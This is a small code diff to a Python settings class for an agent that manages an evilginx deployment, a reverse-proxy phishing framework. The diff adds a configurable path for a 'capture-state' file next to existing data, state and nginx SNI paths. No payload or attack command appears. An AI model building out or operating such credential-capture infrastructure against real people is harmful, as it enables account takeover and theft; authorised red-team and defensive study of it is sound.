@@ -14,6 +14,7 @@ class AgentSettings:
     data_root: str = field(default_factory=lambda: os.environ.get("AGENT_DATA_ROOT", "/opt/evilginx/users"))
     config_root: str = field(default_factory=lambda: os.environ.get("AGENT_CONFIG_ROOT", os.environ.get("AGENT_DATA_ROOT", "/opt/evilginx/users")))
     state_file: str = field(default_factory=lambda: os.environ.get("AGENT_STATE_FILE", "/opt/evilginx/agent-state.json"))
+    capture_state_file: str = field(default_factory=lambda: os.environ.get("AGENT_CAPTURE_STATE", "/opt/evilginx/capture-state.json"))
 
     external_ip: str = field(default_factory=lambda: os.environ.get("EXTERNAL_IP", ""))
     nginx_conf: str = field(default_factory=lambda: os.environ.get("NGINX_CONF", "/etc/nginx/conf.d/evilginx-sni.conf"))
